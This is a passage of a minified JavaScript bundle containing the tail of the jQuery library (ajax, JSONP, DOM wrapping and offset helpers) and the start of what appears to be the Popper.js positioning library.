                    o = o || a;
                  }
                  if (o) return o !== s[0] && s.unshift(o), n[o];
                }(h, x, a)), !c && T.inArray("script", h.dataTypes) > -1 && (h.converters["text script"] = function () {}), w = function (e, t, n, r) {
                  var i,
                    o,
                    a,
                    u,
                    s,
                    d = {},
                    l = e.dataTypes.slice();
                  if (l[1]) for (a in e.converters) d[a.toLowerCase()] = e.converters[a];
                  for (o = l.shift(); o;) if (e.responseFields[o] && (n[e.responseFields[o]] = t), !s && r && e.dataFilter && (t = e.dataFilter(t, e.dataType)), s = o, o = l.shift()) if ("*" === o) o = s;else if ("*" !== s && s !== o) {
                    if (!(a = d[s + " " + o] || d["* " + o])) for (i in d) if ((u = i.split(" "))[1] === o && (a = d[s + " " + u[0]] || d["* " + u[0]])) {
                      !0 === a ? a = d[i] : !0 !== d[i] && (o = u[0], l.unshift(u[1]));
                      break;
                    }
                    if (!0 !== a) if (a && e.throws) t = a(t);else try {
                      t = a(t);
                    } catch (e) {
                      return {
                        state: "parsererror",
                        error: a ? e : "No conversion from " + s + " to " + o
                      };
                    }
                  }
                  return {
                    state: "success",
                    data: t
                  };
                }(h, w, x, c), c ? (h.ifModified && ((_ = x.getResponseHeader("Last-Modified")) && (T.lastModified[i] = _), (_ = x.getResponseHeader("etag")) && (T.etag[i] = _)), 204 === e || "HEAD" === h.type ? E = "nocontent" : 304 === e ? E = "notmodified" : (E = w.state, f = w.data, c = !(b = w.error))) : (b = E, !e && E || (E = "error", e < 0 && (e = 0))), x.status = e, x.statusText = (t || E) + "", c ? g.resolveWith(p, [f, E, x]) : g.rejectWith(p, [x, E, b]), x.statusCode(y), y = void 0, l && m.trigger(c ? "ajaxSuccess" : "ajaxError", [x, h, c ? f : b]), v.fireWith(p, [x, E]), l && (m.trigger("ajaxComplete", [x, h]), --T.active || T.event.trigger("ajaxStop")));
              }
              return x;
            },
            getJSON: function (e, t, n) {
              return T.get(e, t, n, "json");
            },
            getScript: function (e, t) {
              return T.get(e, void 0, t, "script");
            }
          }), T.each(["get", "post"], function (e, t) {
            T[t] = function (e, n, r, i) {
              return v(n) && (i = i || r, r = n, n = void 0), T.ajax(T.extend({
                url: e,
                type: t,
                dataType: i,
                data: n,
                success: r
              }, T.isPlainObject(e) && e));
            };
          }), T.ajaxPrefilter(function (e) {
            var t;
            for (t in e.headers) "content-type" === t.toLowerCase() && (e.contentType = e.headers[t] || "");
          }), T._evalUrl = function (e, t, n) {
            return T.ajax({
              url: e,
              type: "GET",
              dataType: "script",
              cache: !0,
              async: !1,
              global: !1,
              converters: {
                "text script": function () {}
              },
              dataFilter: function (e) {
                T.globalEval(e, t, n);
              }
            });
          }, T.fn.extend({
            wrapAll: function (e) {
              var t;
              return this[0] && (v(e) && (e = e.call(this[0])), t = T(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map(function () {
                for (var e = this; e.firstElementChild;) e = e.firstElementChild;
                return e;
              }).append(this)), this;
            },
            wrapInner: function (e) {
              return v(e) ? this.each(function (t) {
                T(this).wrapInner(e.call(this, t));
              }) : this.each(function () {
                var t = T(this),
                  n = t.contents();
                n.length ? n.wrapAll(e) : t.append(e);
              });
            },
            wrap: function (e) {
              var t = v(e);
              return this.each(function (n) {
                T(this).wrapAll(t ? e.call(this, n) : e);
              });
            },
            unwrap: function (e) {
              return this.parent(e).not("body").each(function () {
                T(this).replaceWith(this.childNodes);
              }), this;
            }
          }), T.expr.pseudos.hidden = function (e) {
            return !T.expr.pseudos.visible(e);
          }, T.expr.pseudos.visible = function (e) {
            return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length);
          }, T.ajaxSettings.xhr = function () {
            try {
              return new r.XMLHttpRequest();
            } catch (e) {}
          };
          var Yt = {
              0: 200,
              1223: 204
            },
            Vt = T.ajaxSettings.xhr();
          g.cors = !!Vt && "withCredentials" in Vt, g.ajax = Vt = !!Vt, T.ajaxTransport(function (e) {
            var t, n;
            if (g.cors || Vt && !e.crossDomain) return {
              send: function (i, o) {
                var a,
                  u = e.xhr();
                if (u.open(e.type, e.url, e.async, e.username, e.password), e.xhrFields) for (a in e.xhrFields) u[a] = e.xhrFields[a];
                for (a in e.mimeType && u.overrideMimeType && u.overrideMimeType(e.mimeType), e.crossDomain || i["X-Requested-With"] || (i["X-Requested-With"] = "XMLHttpRequest"), i) u.setRequestHeader(a, i[a]);
                t = function (e) {
                  return function () {
                    t && (t = n = u.onload = u.onerror = u.onabort = u.ontimeout = u.onreadystatechange = null, "abort" === e ? u.abort() : "error" === e ? "number" != typeof u.status ? o(0, "error") : o(u.status, u.statusText) : o(Yt[u.status] || u.status, u.statusText, "text" !== (u.responseType || "text") || "string" != typeof u.responseText ? {
                      binary: u.response
                    } : {
                      text: u.responseText
                    }, u.getAllResponseHeaders()));
                  };
                }, u.onload = t(), n = u.onerror = u.ontimeout = t("error"), void 0 !== u.onabort ? u.onabort = n : u.onreadystatechange = function () {
                  4 === u.readyState && r.setTimeout(function () {
                    t && n();
                  });
                }, t = t("abort");
                try {
                  u.send(e.hasContent && e.data || null);
                } catch (e) {
                  if (t) throw e;
                }
              },
              abort: function () {
                t && t();
              }
            };
          }), T.ajaxPrefilter(function (e) {
            e.crossDomain && (e.contents.script = !1);
          }), T.ajaxSetup({
            accepts: {
              script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
            },
            contents: {
              script: /\b(?:java|ecma)script\b/
            },
            converters: {
              "text script": function (e) {
                return T.globalEval(e), e;
              }
            }
          }), T.ajaxPrefilter("script", function (e) {
            void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET");
          }), T.ajaxTransport("script", function (e) {
            var t, n;
            if (e.crossDomain || e.scriptAttrs) return {
              send: function (r, i) {
                t = T("<script>").attr(e.scriptAttrs || {}).prop({
                  charset: e.scriptCharset,
                  src: e.url
                }).on("load error", n = function (e) {
                  t.remove(), n = null, e && i("error" === e.type ? 404 : 200, e.type);
                }), b.head.appendChild(t[0]);
              },
              abort: function () {
                n && n();
              }
            };
          });
          var Qt,
            Xt = [],
            Kt = /(=)\?(?=&|$)|\?\?/;
          T.ajaxSetup({
            jsonp: "callback",
            jsonpCallback: function () {
              var e = Xt.pop() || T.expando + "_" + St.guid++;
              return this[e] = !0, e;
            }
          }), T.ajaxPrefilter("json jsonp", function (e, t, n) {
            var i,
              o,
              a,
              u = !1 !== e.jsonp && (Kt.test(e.url) ? "url" : "string" == typeof e.data && 0 === (e.contentType || "").indexOf("application/x-www-form-urlencoded") && Kt.test(e.data) && "data");
            if (u || "jsonp" === e.dataTypes[0]) return i = e.jsonpCallback = v(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, u ? e[u] = e[u].replace(Kt, "$1" + i) : !1 !== e.jsonp && (e.url += (Dt.test(e.url) ? "&" : "?") + e.jsonp + "=" + i), e.converters["script json"] = function () {
              return a || T.error(i + " was not called"), a[0];
            }, e.dataTypes[0] = "json", o = r[i], r[i] = function () {
              a = arguments;
            }, n.always(function () {
              void 0 === o ? T(r).removeProp(i) : r[i] = o, e[i] && (e.jsonpCallback = t.jsonpCallback, Xt.push(i)), a && v(o) && o(a[0]), a = o = void 0;
            }), "script";
          }), g.createHTMLDocument = ((Qt = b.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>", 2 === Qt.childNodes.length), T.parseHTML = function (e, t, n) {
            return "string" != typeof e ? [] : ("boolean" == typeof t && (n = t, t = !1), t || (g.createHTMLDocument ? ((r = (t = b.implementation.createHTMLDocument("")).createElement("base")).href = b.location.href, t.head.appendChild(r)) : t = b), o = !n && [], (i = N.exec(e)) ? [t.createElement(i[1])] : (i = xe([e], t, o), o && o.length && T(o).remove(), T.merge([], i.childNodes)));
            var r, i, o;
          }, T.fn.load = function (e, t, n) {
            var r,
              i,
              o,
              a = this,
              u = e.indexOf(" ");
            return u > -1 && (r = bt(e.slice(u)), e = e.slice(0, u)), v(t) ? (n = t, t = void 0) : t && "object" == typeof t && (i = "POST"), a.length > 0 && T.ajax({
              url: e,
              type: i || "GET",
              dataType: "html",
              data: t
            }).done(function (e) {
              o = arguments, a.html(r ? T("<div>").append(T.parseHTML(e)).find(r) : e);
            }).always(n && function (e, t) {
              a.each(function () {
                n.apply(this, o || [e.responseText, t, e]);
              });
            }), this;
          }, T.expr.pseudos.animated = function (e) {
            return T.grep(T.timers, function (t) {
              return e === t.elem;
            }).length;
          }, T.offset = {
            setOffset: function (e, t, n) {
              var r,
                i,
                o,
                a,
                u,
                s,
                d = T.css(e, "position"),
                l = T(e),
                c = {};
              "static" === d && (e.style.position = "relative"), u = l.offset(), o = T.css(e, "top"), s = T.css(e, "left"), ("absolute" === d || "fixed" === d) && (o + s).indexOf("auto") > -1 ? (a = (r = l.position()).top, i = r.left) : (a = parseFloat(o) || 0, i = parseFloat(s) || 0), v(t) && (t = t.call(e, n, T.extend({}, u))), null != t.top && (c.top = t.top - u.top + a), null != t.left && (c.left = t.left - u.left + i), "using" in t ? t.using.call(e, c) : ("number" == typeof c.top && (c.top += "px"), "number" == typeof c.left && (c.left += "px"), l.css(c));
            }
          }, T.fn.extend({
            offset: function (e) {
              if (arguments.length) return void 0 === e ? this : this.each(function (t) {
                T.offset.setOffset(this, e, t);
              });
              var t,
                n,
                r = this[0];
              return r ? r.getClientRects().length ? (t = r.getBoundingClientRect(), n = r.ownerDocument.defaultView, {
                top: t.top + n.pageYOffset,
                left: t.left + n.pageXOffset
              }) : {
                top: 0,
                left: 0
              } : void 0;
            },
            position: function () {
              if (this[0]) {
                var e,
                  t,
                  n,
                  r = this[0],
                  i = {
                    top: 0,
                    left: 0
                  };
                if ("fixed" === T.css(r, "position")) t = r.getBoundingClientRect();else {
                  for (t = this.offset(), n = r.ownerDocument, e = r.offsetParent || n.documentElement; e && (e === n.body || e === n.documentElement) && "static" === T.css(e, "position");) e = e.parentNode;
                  e && e !== r && 1 === e.nodeType && ((i = T(e).offset()).top += T.css(e, "borderTopWidth", !0), i.left += T.css(e, "borderLeftWidth", !0));
                }
                return {
                  top: t.top - i.top - T.css(r, "marginTop", !0),
                  left: t.left - i.left - T.css(r, "marginLeft", !0)
                };
              }
            },
            offsetParent: function () {
              return this.map(function () {
                for (var e = this.offsetParent; e && "static" === T.css(e, "position");) e = e.offsetParent;
                return e || ae;
              });
            }
          }), T.each({
            scrollLeft: "pageXOffset",
            scrollTop: "pageYOffset"
          }, function (e, t) {
            var n = "pageYOffset" === t;
            T.fn[e] = function (r) {
              return z(this, function (e, r, i) {
                var o;
                if (y(e) ? o = e : 9 === e.nodeType && (o = e.defaultView), void 0 === i) return o ? o[t] : e[r];
                o ? o.scrollTo(n ? o.pageXOffset : i, n ? i : o.pageYOffset) : e[r] = i;
              }, e, r, arguments.length);
            };
          }), T.each(["top", "left"], function (e, t) {
            T.cssHooks[t] = Ve(g.pixelPosition, function (e, n) {
              if (n) return n = Ye(e, t), qe.test(n) ? T(e).position()[t] + "px" : n;
            });
          }), T.each({
            Height: "height",
            Width: "width"
          }, function (e, t) {
            T.each({
              padding: "inner" + e,
              content: t,
              "": "outer" + e
            }, function (n, r) {
              T.fn[r] = function (i, o) {
                var a = arguments.length && (n || "boolean" != typeof i),
                  u = n || (!0 === i || !0 === o ? "margin" : "border");
                return z(this, function (t, n, i) {
                  var o;
                  return y(t) ? 0 === r.indexOf("outer") ? t["inner" + e] : t.document.documentElement["client" + e] : 9 === t.nodeType ? (o = t.documentElement, Math.max(t.body["scroll" + e], o["scroll" + e], t.body["offset" + e], o["offset" + e], o["client" + e])) : void 0 === i ? T.css(t, n, u) : T.style(t, n, i, u);
                }, t, a ? i : void 0, a);
              };
            });
          }), T.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function (e, t) {
            T.fn[t] = function (e) {
              return this.on(t, e);
            };
          }), T.fn.extend({
            bind: function (e, t, n) {
              return this.on(e, null, t, n);
            },
            unbind: function (e, t) {
              return this.off(e, null, t);
            },
            delegate: function (e, t, n, r) {
              return this.on(t, e, n, r);
            },
            undelegate: function (e, t, n) {
              return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n);
            },
            hover: function (e, t) {
              return this.mouseenter(e).mouseleave(t || e);
            }
          }), T.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function (e, t) {
            T.fn[t] = function (e, n) {
              return arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t);
            };
          });
          var Jt = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
          T.proxy = function (e, t) {
            var n, r, i;
            if ("string" == typeof t && (n = e[t], t = e, e = n), v(e)) return r = u.call(arguments, 2), i = function () {
              return e.apply(t || this, r.concat(u.call(arguments)));
            }, i.guid = e.guid = e.guid || T.guid++, i;
          }, T.holdReady = function (e) {
            e ? T.readyWait++ : T.ready(!0);
          }, T.isArray = Array.isArray, T.parseJSON = JSON.parse, T.nodeName = k, T.isFunction = v, T.isWindow = y, T.camelCase = X, T.type = E, T.now = Date.now, T.isNumeric = function (e) {
            var t = T.type(e);
            return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e));
          }, T.trim = function (e) {
            return null == e ? "" : (e + "").replace(Jt, "");
          }, void 0 === (n = function () {
            return T;
          }.apply(t, [])) || (e.exports = n);
          var Gt = r.jQuery,
            Zt = r.$;
          return T.noConflict = function (e) {
            return r.$ === T && (r.$ = Zt), e && r.jQuery === T && (r.jQuery = Gt), T;
          }, void 0 === i && (r.jQuery = r.$ = T), T;
        });
      },
      7425: () => {},
      8981: (e, t, n) => {
        "use strict";

        n.r(t), n.d(t, {
          default: () => oe
        });
        var r = "undefined" != typeof window && "undefined" != typeof document && "undefined" != typeof navigator,
          i = function () {
            for (var e = ["Edge", "Trident", "Firefox"], t = 0; t < e.length; t += 1) if (r && navigator.userAgent.indexOf(e[t]) >= 0) return 1;
            return 0;
          }();
        var o = r && window.Promise ? function (e) {
          var t = !1;
          return function () {
            t || (t = !0, window.Promise.resolve().then(function () {
              t = !1, e();
            }));
          };
        } : function (e) {
          var t = !1;
          return function () {
            t || (t = !0, setTimeout(function () {
              t = !1, e();
            }, i));
          };
        };
        function a(e) {
          return e && "[object Function]" === {}.toString.call(e);
        }
        function u(e, t) {
          if (1 !== e.nodeType) return [];
          var n = e.ownerDocument.defaultView.getComputedStyle(e, null);
          return t ? n[t] : n;
        }
        function s(e) {
          return "HTML" === e.nodeName ? e : e.parentNode || e.host;
        }
        function d(e) {
          if (!e) return document.body;
          switch (e.nodeName) {
            case "HTML":
            case "BODY":
              return e.ownerDocument.body;
            case "#document":
              return e.body;
          }
          var t = u(e),
            n = t.overflow,
            r = t.overflowX,
            i = t.overflowY;
          return /(auto|scroll|overlay)/.test(n + i + r) ? e : d(s(e));
        }
        function l(e) {
          return e && e.referenceNode ? e.referenceNode : e;
        }
        var c = r && !(!window.MSInputMethodContext || !document.documentMode),
          f = r && /MSIE 10/.test(navigator.userAgent);
        function h(e) {
          return 11 === e ? c : 10 === e ? f : c || f;
        }
        function p(e) {
          if (!e) return document.documentElement;
          for (var t = h(10) ? document.body : null, n = e.offsetParent || null; n === t && e.nextElementSibling;) n = (e = e.nextElementSibling).offsetParent;
          var r = n && n.nodeName;
          return r && "BODY" !== r && "HTML" !== r ? -1 !== ["TH", "TD", "TABLE"].indexOf(n.nodeName) && "static" === u(n, "position") ? p(n) : n : e ? e.ownerDocument.documentElement : document.documentElement;
        }
        function m(e) {
          return null !== e.parentNode ? m(e.parentNode) : e;
        }
        function g(e, t) {
          if (!(e && e.nodeType && t && t.nodeType)) return document.documentElement;
          var n = e.compareDocumentPosition(t) & Node.DOCUMENT_POSITION_FOLLOWING,
            r = n ? e : t,
            i = n ? t : e,
            o = document.createRange();
          o.setStart(r, 0), o.setEnd(i, 0);
          var a,
            u,
            s = o.commonAncestorContainer;
          if (e !== s && t !== s || r.contains(i)) return "BODY" === (u = (a = s).nodeName) || "HTML" !== u && p(a.firstElementChild) !== a ? p(s) : s;
          var d = m(e);
          return d.host ? g(d.host, t) : g(e, m(t).host);
        }
        function v(e) {
          var t = "top" === (arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "top") ? "scrollTop" : "scrollLeft",
            n = e.nodeName;
          if ("BODY" === n || "HTML" === n) {
            var r = e.ownerDocument.documentElement;
            return (e.ownerDocument.scrollingElement || r)[t];
          }
          return e[t];
        }
        function y(e, t) {
          var n = "x" === t ? "Left" : "Top",
            r = "Left" === n ? "Right" : "Bottom";
          return parseFloat(e["border" + n + "Width"]) + parseFloat(e["border" + r + "Width"]);
        }
        function b(e, t, n, r) {
          return Math.max(t["offset" + e], t["scroll" + e], n["client" + e], n["offset" + e], n["scroll" + e], h(10) ? parseInt(n["offset" + e]) + parseInt(r["margin" + ("Height" === e ? "Top" : "Left")]) + parseInt(r["margin" + ("Height" === e ? "Bottom" : "Right")]) : 0);
        }
        function w(e) {
          var t = e.body,
            n = e.documentElement,
            r = h(10) && getComputedStyle(n);
          return {
            height: b("Height", t, n, r),
            width: b("Width", t, n, r)
          };
        }
        var _ = function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          },
          E = function () {
            function e(e, t) {
              for (var n = 0; n < t.length; n++) {
                var r = t[n];
                r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r);
              }
            }
            return function (t, n, r) {
              return n && e(t.prototype, n), r && e(t, r), t;
            };
          }(),
          x = function (e, t, n) {
            return t in e ? Object.defineProperty(e, t, {
              value: n,
              enumerable: !0,
              configurable: !0,
              writable: !0
            }) : e[t] = n, e;
          },
          T = Object.assign || function (e) {
            for (var t = 1; t < arguments.length; t++) {
              var n = arguments[t];
              for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
            }
            return e;
          };
        function C(e) {
          return T({}, e, {
            right: e.left + e.width,
            bottom: e.top + e.height
          });
        }
        function S(e) {
          var t = {};
          try {
            if (h(10)) {
              t = e.getBoundingClientRect();
              var n = v(e, "top"),
                r = v(e, "left");
              t.top += n, t.left += r, t.bottom += n, t.right += r;
            } else t = e.getBoundingClientRect();
          } catch (e) {}
          var i = {
              left: t.left,
              top: t.top,
              width: t.right - t.left,
              height: t.bottom - t.top
            },
            o = "HTML" === e.nodeName ? w(e.ownerDocument) : {},
            a = o.width || e.clientWidth || i.width,
            s = o.height || e.clientHeight || i.height,
            d = e.offsetWidth - a,
            l = e.offsetHeight - s;
          if (d || l) {
            var c = u(e);
            d -= y(c, "x"), l -= y(c, "y"), i.width -= d, i.height -= l;
          }
          return C(i);
        }
        function D(e, t) {
          var n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
            r = h(10),
            i = "HTML" === t.nodeName,
            o = S(e),
            a = S(t),
            s = d(e),
            l = u(t),
            c = parseFloat(l.borderTopWidth),
            f = parseFloat(l.borderLeftWidth);
          n && i && (a.top = Math.max(a.top, 0), a.left = Math.max(a.left, 0));
          var p = C({
            top: o.top - a.top - c,
            left: o.left - a.left - f,
            width: o.width,
            height: o.height
          });
          if (p.marginTop = 0, p.marginLeft = 0, !r && i) {
            var m = parseFloat(l.marginTop),
              g = parseFloat(l.marginLeft);
            p.top -= c - m, p.bottom -= c - m, p.left -= f - g, p.right -= f - g, p.marginTop = m, p.marginLeft = g;
          }
          return (r && !n ? t.contains(s) : t === s && "BODY" !== s.nodeName) && (p = function (e, t) {
            var n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
              r = v(t, "top"),
              i = v(t, "left"),
              o = n ? -1 : 1;
            return e.top += r * o, e.bottom += r * o, e.left += i * o, e.right += i * o, e;
          }(p, t)), p;
        }
        function A(e) {
          var t = e.nodeName;
          if ("BODY" === t || "HTML" === t) return !1;
          if ("fixed" === u(e, "position")) return !0;
          var n = s(e);
          return !!n && A(n);
        }
        function $(e) {
          if (!e || !e.parentElement || h()) return document.documentElement;
          for (var t = e.parentElement; t && "none" === u(t, "transform");) t = t.parentElement;
          return t || document.documentElement;
        }
        function k(e, t, n, r) {
          var i = arguments.length > 4 && void 0 !== arguments[4] && arguments[4],
            o = {
              top: 0,
              left: 0
            },
            a = i ? $(e) : g(e, l(t));
          if ("viewport" === r) o = function (e) {
            var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
              n = e.ownerDocument.documentElement,
              r = D(e, n),
              i = Math.max(n.clientWidth, window.innerWidth || 0),
              o = Math.max(n.clientHeight, window.innerHeight || 0),
              a = t ? 0 : v(n),
              u = t ? 0 : v(n, "left");
            return C({
              top: a - r.top + r.marginTop,
              left: u - r.left + r.marginLeft,
              width: i,
              height: o
            });
          }(a, i);else {
            var u = void 0;
            "scrollParent" === r ? "BODY" === (u = d(s(t))).nodeName && (u = e.ownerDocument.documentElement) : u = "window" === r ? e.ownerDocument.documentElement : r;
            var c = D(u, a, i);
            if ("HTML" !== u.nodeName || A(a)) o = c;else {
              var f = w(e.ownerDocument),
                h = f.height,
                p = f.width;
              o.top += c.top - c.marginTop, o.bottom = h + c.top, o.left += c.left - c.marginLeft, o.right = p + c.left;
            }
          }
          var m = "number" == typeof (n = n || 0);
          return o.left += m ? n : n.left || 0, o.top += m ? n : n.top || 0, o.right -= m ? n : n.right || 0, o.bottom -= m ? n : n.bottom || 0, o;
        }
        function N(e, t, n, r, i) {
          var o = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : 0;
          if (-1 === e.indexOf("auto")) return e;
          var a = k(n, r, o, i),
            u = {
              top: {
                width: a.width,
                height: t.top - a.top
              },
              right: {
                width: a.right - t.right,
                height: a.height
              },
              bottom: {
                width: a.width,
                height: a.bottom - t.bottom
              },
              left: {
                width: t.left - a.left,
                height: a.height
              }
            },
            s = Object.keys(u).map(function (e) {
              return T({
                key: e
              }, u[e], {
                area: (t = u[e], t.width * t.height)
              });
              var t;
            }).sort(function (e, t) {
              return t.area - e.area;
            }),
            d = s.filter(function (e) {
              var t = e.width,
                r = e.height;
              return t >= n.clientWidth && r >= n.clientHeight;
            }),
            l = d.length > 0 ? d[0].key : s[0].key,
            c = e.split("-")[1];
          return l + (c ? "-" + c : "");
        }
        function O(e, t, n) {
          var r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : null;
          return D(n, r ? $(t) : g(t, l(n)), r);
        }
        function j(e) {
          var t = e.ownerDocument.defaultView.getComputedStyle(e),
            n = parseFloat(t.marginTop || 0) + parseFloat(t.marginBottom || 0),
            r = parseFloat(t.marginLeft || 0) + parseFloat(t.marginRight || 0);
          return {
            width: e.offsetWidth + r,
            height: e.offsetHeight + n
          };
        }
        function R(e) {
          var t = {
            left: "right",
            right: "left",
            bottom: "top",
            top: "bottom"
          };
          return e.replace(/left|right|bottom|top/g, function (e) {
            return t[e];
          });
        }
        function P(e, t, n) {
          n = n.split("-")[0];
          var r = j(e),
            i = {
              width: r.width,
              height: r.height
            },
            o = -1 !== ["right", "left"].indexOf(n),
            a = o ? "top" : "left",
            u = o ? "left" : "top",
            s = o ? "height" : "width",
            d = o ? "width" : "height";
          return i[a] = t[a] + t[s] / 2 - r[s] / 2, i[u] = n === u ? t[u] - r[d] : t[R(u)], i;
        }
        function L(e, t) {
          return Array.prototype.find ? e.find(t) : e.filter(t)[0];
        }
        function I(e, t, n) {
          return (void 0 === n ? e : e.slice(0, function (e, t, n) {
            if (Array.prototype.findIndex) return e.findIndex(function (e) {
              return e[t] === n;
            });
            var r = L(e, function (e) {
              return e[t] === n;
            });
            return e.indexOf(r);
          }(e, "name", n))).forEach(function (e) {
            e.function && console.warn("`modifier.function` is deprecated, use `modifier.fn`!");
            var n = e.function || e.fn;
            e.enabled && a(n) && (t.offsets.popper = C(t.offsets.popper), t.offsets.reference = C(t.offsets.reference), t = n(t, e));
          }), t;
        }
        function F() {
          if (!this.state.isDestroyed) {
            var e = {
              instance: this,
              styles: {},
              arrowStyles: {},
              attributes: {},
              flipped: !1,
              offsets: {}
            };
            e.offsets.reference = O(this.state, this.popper, this.reference, this.options.positionFixed), e.placement = N(this.options.placement, e.offsets.reference, this.popper, this.reference, this.options.modifiers.flip.boundariesElement, this.options.modifiers.flip.padding), e.originalPlacement = e.placement, e.positionFixed = this.options.positionFixed, e.offsets.popper = P(this.popper, e.offsets.reference, e.placement), e.offsets.popper.position = this.options.positionFixed ? "fixed" : "absolute", e = I(this.modifiers, e), this.state.isCreated ? this.options.onUpdate(e) : (this.state.isCreated = !0, this.options.onCreate(e));
          }
        }
        function B(e, t) {
          return e.some(function (e) {
            var n = e.name;
            return e.enabled && n === t;
          });
        }
        function M(e) {
          for (var t = [!1, "ms", "Webkit", "Moz", "O"], n = e.charAt(0).toUpperCase() + e.slice(1), r = 0; r < t.length; r++) {
            var i = t[r],
              o = i ? "" + i + n : e;
            if (void 0 !== document.body.style[o]) return o;
          }
          return null;
        }
        function U() {
          return this.state.isDestroyed = !0, B(this.modifiers, "applyStyle") && (this.popper.removeAttribute("x-placement"), this.popper.style.position = "", this.popper.style.top = "", this.popper.style.left = "", this.popper.style.right = "", this.popper.style.bottom = "", this.popper.style.willChange = "", this.popper.style[M("transform")] = ""), this.disableEventListeners(), this.options.removeOnDestroy && this.popper.parentNode.removeChild(this.popper), this;
        }
        function q(e) {
          var t = e.ownerDocument;
          return t ? t.defaultView : window;
        }
        function H(e, t, n, r) {
          var i = "BODY" === e.nodeName,
            o = i ? e.ownerDocument.defaultView : e;
          o.addEventListener(t, n, {
            passive: !0
          }), i || H(d(o.parentNode), t, n, r), r.push(o);
        }
        function W(e, t, n, r) {
          n.updateBound = r, q(e).addEventListener("resize", n.updateBound, {
            passive: !0
          });
          var i = d(e);
          return H(i, "scroll", n.updateBound, n.scrollParents), n.scrollElement = i, n.eventsEnabled = !0, n;
        }
        function z() {
          this.state.eventsEnabled || (this.state = W(this.reference, this.options, this.state, this.scheduleUpdate));
        }
        function Y() {
          var e, t;
          this.state.eventsEnabled && (cancelAnimationFrame(this.scheduleUpdate), this.state = (e = this.reference, t = this.state, q(e).removeEventListener("resize", t.updateBound), t.scrollParents.forEach(function (e) {
            e.removeEventListener("scroll", t.updateBound);
          }), t.updateBound = null, t.scrollParents = [], t.scrollElement = null, t.eventsEnabled = !1, t));
        }
        function V(e) {
          return "" !== e && !isNaN(parseFloat(e)) && isFinite(e);
        }
        function Q(e, t) {
          Object.keys(t).forEach(function (n) {
            var r = "";
            -1 !== ["width", "height", "top", "right", "bottom", "left"].indexOf(n) && V(t[n]) && (r = "px"), e.style[n] = t[n] + r;
          });
        }
        var X = r && /Firefox/i.test(navigator.userAgent);
        function K(e, t, n) {
          var r = L(e, function (e) {
              return e.name === t;
            }),
            i = !!r && e.some(function (e) {
              return e.name === n && e.enabled && e.order < r.order;
            });
          if (!i) {
            var o = "`" + t + "`",
              a = "`" + n + "`";
            console.warn(a + " modifier is required by " + o + " modifier in order to work, be sure to include it before " + o + "!");
          }
          return i;
        }
        var J = ["auto-start", "auto", "auto-end", "top-start", "top", "top-end", "right-start", "right", "right-end", "bottom-end", "bottom", "bottom-start", "left-end", "left", "left-start"],
          G = J.slice(3);
        function Z(e) {
          var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
            n = G.indexOf(e),
            r = G.slice(n + 1).concat(G.slice(0, n));
          return t ? r.reverse() : r;
        }
        var ee = {
          FLIP: "flip",
          CLOCKWISE: "clockwise",
          COUNTERCLOCKWISE: "counterclockwise"
        };
        function te(e, t, n, r) {
          var i = [0, 0],
            o = -1 !== ["right", "left"].indexOf(r),
            a = e.split(/(\+|\-)/).map(function (e) {
              return e.trim();
            }),
            u = a.indexOf(L(a, function (e) {
              return -1 !== e.search(/,|\s/);
            }));
          a[u] && -1 === a[u].indexOf(",") && console.warn("Offsets separated by white space(s) are deprecated, use a comma (,) instead.");
          var s = /\s*,\s*|\s+/,
            d = -1 !== u ? [a.slice(0, u).concat([a[u].split(s)[0]]), [a[u].split(s)[1]].concat(a.slice(u + 1))] : [a];
          return d = d.map(function (e, r) {
            var i = (1 === r ? !o : o) ? "height" : "width",
              a = !1;
            return e.reduce(function (e, t) {
              return "" === e[e.length - 1] && -1 !== ["+", "-"].indexOf(t) ? (e[e.length - 1] = t, a = !0, e) : a ? (e[e.length - 1] += t, a = !1, e) : e.concat(t);
            }, []).map(function (e) {
              return function (e, t, n, r) {
                var i = e.match(/((?:\-|\+)?\d*\.?\d*)(.*)/),
                  o = +i[1],
                  a = i[2];
                if (!o) return e;
                if (0 === a.indexOf("%")) {
                  return C("%p" === a ? n : r)[t] / 100 * o;
                }
                if ("vh" === a || "vw" === a) return ("vh" === a ? Math.max(document.documentElement.clientHeight, window.innerHeight || 0) : Math.max(document.documentElement.clientWidth, window.innerWidth || 0)) / 100 * o;
                return o;
              }(e, i, t, n);
            });
          }), d.forEach(function (e, t) {
            e.forEach(function (n, r) {
              V(n) && (i[t] += n * ("-" === e[r - 1] ? -1 : 1));
            });
          }), i;
        }
        var ne = {
            shift: {
              order: 100,
              enabled: !0,
              fn: function (e) {
                var t = e.placement,
                  n = t.split("-")[0],
                  r = t.split("-")[1];
                if (r) {
                  var i = e.offsets,
                    o = i.reference,
                    a = i.popper,
                    u = -1 !== ["bottom", "top"].indexOf(n),
                    s = u ? "left" : "top",
                    d = u ? "width" : "height",
                    l = {
                      start: x({}, s, o[s]),
                      end: x({}, s, o[s] + o[d] - a[d])
                    };
                  e.offsets.popper = T({}, a, l[r]);
                }
                return e;
              }
            },
            offset: {
              order: 200,
              enabled: !0,
              fn: function (e, t) {
                var n = t.offset,
                  r = e.placement,
                  i = e.offsets,
                  o = i.popper,
